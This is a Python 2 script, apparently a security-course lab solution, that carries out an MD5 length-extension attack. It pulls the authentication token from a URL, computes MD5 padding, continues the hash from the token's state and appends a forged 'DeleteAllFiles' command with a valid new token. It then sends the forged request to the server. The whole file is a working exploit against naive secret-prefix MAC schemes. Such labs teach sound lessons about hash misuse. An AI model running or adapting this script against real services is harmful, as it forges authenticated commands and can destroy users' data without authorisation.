#!/usr/bin/env python
import os
import sys
import math

import httplib, urlparse, urllib

from pymd5 import md5, padding

url = sys.argv[1]
h = md5()


cmd3_opening = ""
#command to length extension attack with
cmd3 = ("DeleteAllFiles")
token = ""
new_token = ""
paddedCmd3 = ""
m = ""

#first need to parse the token out of the url
def token_finder(url):
	t = ("token=")
	u = ("&")
	url_token_index = url.find(t)
	url_tokend_index = url.find(u, url_token_index)

	#two cases, 1) token followed by a command or 2) token at end of url
	if url_tokend_index != -1:
		url_token = url[url_token_index+len(t):url_tokend_index]
	else:
		url_token = url[url_token_index+len(t):]

	return url_token

#find the length of the message
def message_length_finder(url):
	t = "user="

	url_user_index = url.find(t)

	url_message = url[url_user_index:]

	return url_message

#to find the latest command number so I can generate correct command number
def command_num_finder(url):
	t = "command"
	num_index = url.rfind(t)

	command_num = url[num_index+len(t):num_index+len(t)+1]

	return command_num

#find the token
token = token_finder(url)

#generate the header for the new command
cmd3_opening = "&command" + str(int(command_num_finder(url)) + 1) + "="
#make new command to concatenate to the end of the url
cmd3 = cmd3_opening + cmd3

#length of password + rest of message
m = 8 + len(message_length_finder(url))


paddedCmd3 = urllib.quote(padding(int(m) * 8)) + cmd3

#update the token using the md5 module
h = md5(state=token.decode("hex"), count=512)
h.update(cmd3)
new_token = h.hexdigest()

#make a new url from the new token with the new command
url = str.replace(url, token, new_token) + paddedCmd3


#code given to connect to server and send requests
parsedUrl = urlparse.urlparse(url)
conn = httplib.HTTPConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
